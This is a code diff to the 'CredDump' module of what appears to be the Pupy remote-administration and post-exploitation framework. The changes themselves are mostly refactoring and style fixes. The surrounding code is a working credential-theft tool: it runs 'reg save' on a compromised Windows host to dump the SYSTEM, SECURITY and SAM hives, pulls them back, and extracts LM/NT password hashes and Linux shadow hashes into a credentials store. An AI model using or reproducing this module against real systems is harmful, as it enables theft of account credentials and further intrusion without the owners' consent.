@@ -13,12 +13,11 @@
 # saves the hives with a random name
 # do not write the saves on the target
 
-from pupylib.PupyModule import *
-from pupylib.PupyCompleter import *
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from pupylib.utils.credentials import Credentials
 from modules.lib.utils.shell_exec import shell_exec
 
-from rpyc.utils.classic import download
+from network.lib.rpc.utils.classic import download
 
 import os
 import os.path
@@ -39,12 +38,13 @@ __class_name__="CredDump"
 class CredDump(PupyModule):
     """ download the hives from a remote windows system and dump creds """
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='hive', description=self.__doc__)
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='hive', description=cls.__doc__)
 
     def run(self, args):
-        config = self.client.pupsrv.config or PupyConfig()
-        self.db = Credentials(client=self.client.short_name(), config=self.config)
+        config = self.client.pupsrv.config
+        self.db = Credentials(client=self.client, config=self.config)
         self.rep = os.path.join(config.get_folder('creds'), self.client.short_name())
 
         try:
@@ -68,7 +68,7 @@ class CredDump(PupyModule):
                 'Login': hsh[0],
                 'Category': 'System hash',
                 'CredType': 'hash'
-            } for hsh in hashes ])
+            } for hsh in hashes])
 
             for hsh in hashes:
                 self.log('{}'.format(hsh))
@@ -83,7 +83,7 @@ class CredDump(PupyModule):
 
         def add_hashes(line):
             user, hsh, rest = line.split(':', 2)
-            if not hsh in ('!','*','x') and not (user, hsh) in known:
+            if hsh not in ('!','*','x') and (user, hsh) not in known:
                 known.add((user, hsh))
                 hashes.append(line)
 
@@ -148,8 +148,7 @@ class CredDump(PupyModule):
             'Login': hsh.split(':')[0],
             'Category': 'Shadow hash',
             'CredType': 'hash'
-            } for hsh in hashes
-        ])
+        } for hsh in hashes])
 
         for hsh in hashes:
             self.log('{}'.format(hsh))
@@ -173,11 +172,12 @@ class CredDump(PupyModule):
         self.success("saving SYSTEM hives in %TEMP%...")
         cmds = ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM", "reg save HKLM\\SECURITY %TEMP%/SECURITY", "reg save HKLM\\SAM %TEMP%/SAM")
         if is_vista:
-            cmds = ( x+' /y' for x in cmds )
+            cmds = (x+' /y' for x in cmds)
 
         for cmd in cmds:
             self.info("running %s..." % cmd)
             self.log(shell_exec(self.client, cmd))
+
         self.success("hives saved!")
         remote_temp=self.client.conn.modules['os.path'].expandvars("%TEMP%")
 
@@ -228,8 +228,12 @@ class CredDump(PupyModule):
         hbootkey = get_hbootkey(samaddr,bootkey)
         for user in get_user_keys(samaddr):
             lmhash, nthash = get_user_hashes(user,hbootkey)
-            if not lmhash: lmhash = empty_lm
-            if not nthash: nthash = empty_nt
+            if not lmhash:
+                lmhash = empty_lm
+
+            if not nthash:
+                nthash = empty_nt
+
             self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
             hashes.append({
                 'Login': get_user_name(user),
@@ -255,11 +259,12 @@ class CredDump(PupyModule):
 
     def dump(self, src, length=8):
         FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
-        N=0; result=''
+        N=0
+        result=''
         while src:
-           s,src = src[:length],src[length:]
-           hexa = ' '.join(["%02X"%ord(x) for x in s])
-           s = s.translate(FILTER)
-           result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
-           N+=length
+            s,src = src[:length],src[length:]
+            hexa = ' '.join(["%02X"%ord(x) for x in s])
+            s = s.translate(FILTER)
+            result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
+            N+=length
         return result
